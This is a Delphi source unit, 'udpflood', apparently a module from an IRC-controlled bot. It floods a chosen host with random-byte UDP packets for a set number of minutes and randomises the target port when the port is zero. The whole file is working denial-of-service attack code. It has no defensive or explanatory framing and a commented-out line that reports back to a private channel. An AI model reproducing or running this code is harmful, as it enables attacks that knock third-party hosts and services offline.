unit udpflood;

interface

uses
  Winsock,
  windows,
  functions;

type

  Tudp = Record
    host            :string;
    port            :integer;
    num             :integer;
    delay           :integer;
    size            :integer;
  end;

var
  udp :Tudp;
  udpthread :Thandle;  

procedure udpfloodhost;

const
  MAXUDPPORT = 65535;
  MAXPINGSIZE	= 65500;

implementation

uses commands;

procedure udpfloodhost;
var
  wsData: WSAData;
  pbuff: string;
  usock: TSocket;
  iaddr: IN_ADDR;
  ssin: SOCKADDR_IN;
  i: integer;
begin

usock := Socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
if usock = SOCKET_ERROR then
  exit;
ssin.sin_family := AF_INET;

iaddr.s_addr := inet_addr(pchar(udp.host));
ssin.sin_addr := iaddr;

if (udp.port < 0) then udp.port := 1;
if (udp.port > MAXUDPPORT) then udp.port := MAXUDPPORT;
ssin.sin_port := htons(udp.port);

udp.num := (udp.num * 60000) + GetTickCount; //convert to minute

if (udp.delay < 1) then udp.delay := 1;
if (udp.size > MAXPINGSIZE) then udp.size := MAXPINGSIZE;

for i := 0 to udp.size do //generate buffer
  begin
    Randomize;
    pbuff := pbuff + Char(Random(255));
  end;

while (udp.num > GetTickCount) do
  begin
    Randomize;
    for i := 0 to 11 do begin
        sendto(usock, pbuff, udp.size - Random(10), 0, ssin, Sizeof(ssin));
        Sleep(udp.delay);
      end;

    if udp.port = 0 then
      ssin.sin_port :=  htons(Random(MAXUDPPORT)+1); //generate random port if port = 0
  end;

//PrivateMessageChannel('[UDP] Finished sending packets to ' + udp.host);

CloseSocket(usock);
Suspendthread(udpthread);
ExitThread(0);
end;

end.
 